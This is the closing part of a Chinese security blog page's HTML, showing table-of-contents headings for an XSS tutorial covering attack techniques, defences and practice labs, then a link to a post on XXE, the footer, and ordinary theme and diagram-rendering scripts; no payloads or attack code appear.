XSS 平台</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-2-Flash-XSS-%E5%88%A9%E7%94%A8"><span class="top-box-text">5.2 Flash XSS 利用</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-3-UXSS-%E2%80%94-CVE-2021-34506"><span class="top-box-text">5.3 UXSS — CVE-2021-34506</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-4-PDF-XSS"><span class="top-box-text">5.4 PDF XSS</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-5-%E8%A1%A8%E5%8D%95%E5%8A%AB%E6%8C%81-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="top-box-text">5.5 表单劫持 &amp; 权限维持</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-6-Flash-%E9%92%93%E9%B1%BC-MSF-%E6%8D%86%E7%BB%91%E4%B8%8A%E7%BA%BF"><span class="top-box-text">5.6 Flash 钓鱼 + MSF 捆绑上线</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-7-%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BD%91%E9%A9%AC-MSF"><span class="top-box-text">5.7 浏览器网马 + MSF</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%85%AD%E3%80%81XSS-%E9%98%B2%E5%BE%A1"><span class="top-box-text">六、XSS 防御</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#6-1-%E8%BE%93%E5%85%A5%E8%BF%87%E6%BB%A4"><span class="top-box-text">6.1 输入过滤</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#6-2-%E8%BE%93%E5%87%BA%E7%BC%96%E7%A0%81"><span class="top-box-text">6.2 输出编码</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#6-3-%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95"><span class="top-box-text">6.3 黑白名单</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#6-4-DOM-%E5%9E%8B-XSS-%E9%98%B2%E5%BE%A1"><span class="top-box-text">6.4 DOM 型 XSS 防御</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#6-5-HttpOnly"><span class="top-box-text">6.5 HttpOnly</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#6-6-CSP"><span class="top-box-text">6.6 CSP</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%83%E3%80%81XSS-%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="top-box-text">七、XSS 测试代码</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%85%AB%E3%80%81BeEF-%E6%A1%86%E6%9E%B6"><span class="top-box-text">八、BeEF 框架</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B9%9D%E3%80%81%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0"><span class="top-box-text">九、靶场练习</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%8D%81%E3%80%81%E5%9C%A8%E7%BA%BF-XSS-%E6%B8%B8%E6%88%8F"><span class="top-box-text">十、在线 XSS 游戏</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E5%AD%A6%E4%B9%A0%E5%8F%82%E8%80%83"><span class="top-box-text">十一、学习参考</span></a></li></ol>
+        </div>
+          
+      </div>
+    </div>
+
+    
+      <div class="next-post">
+        <a class="purple-link" href="/2026/06/28/xxe/">
+          <h3 class="post-title">
+            
+            下一篇：XML 外部实体注入（XXE）
+          </h3>
+        </a>
+      </div>
+    
+  </div>
+
+
+
+
+
+
+
+<footer>
+<div class="site-footer">
+  <div class="social-container">
+    
+      
+        <a aria-label="跳转至github" href="https://github.com/z50n6" target="_blank">
+          <i class="icon icon-github"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
+  
+  
+  
+    
+     |
+    
+      <a href="/atom.xml" target="_blank">RSS</a>
+  
+  
+  
+  
+</div>
+</footer>
+
+
+      </div>
+    </div>
+    
+<script id="hexo-configurations"> window.theme_config = {"image":{"lazyload_enable":true,"lazyload_placeholder":null,"photo_zoom":"simple-lightbox"},"search":{"enable":true,"type":"json","placeholder":"输入关键词搜索...","algolia":{"appID":"","apiKey":"","indexName":""}},"language":"zh-CN"}; window.is_post = true; </script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+  <script src="/js/simple-lightbox.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {new SimpleLightbox('.post-detail .simple-lightbox', {fileExt: false,captionsData:'alt'});});</script><script>window.__runMermaid = function () {
+      if (typeof mermaid === 'undefined' || window.__mermaidDone) { return; }
+      window.__mermaidDone = true;
+      var dark = document.documentElement.classList.contains('dark')
+        || (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      mermaid.initialize({ startOnLoad: false, securityLevel: 'loose',
+        theme: dark ? "dark" : "default" });
+      mermaid.run({ querySelector: '.mermaid' }).catch(function (e) {
+        console.error('mermaid render failed:', e);
+      });
+    };</script><script src="/vendor/mermaid.min.js" charset="utf-8" onload="window.__runMermaid()"></script><script src="https://cdn.jsdelivr.net/npm/mermaid@10.9.1/dist/mermaid.min.js" charset="utf-8" onload="window.__runMermaid()"></script><script>window.addEventListener('load', function () { window.__runMermaid(); });</script></body>
+</html>
+
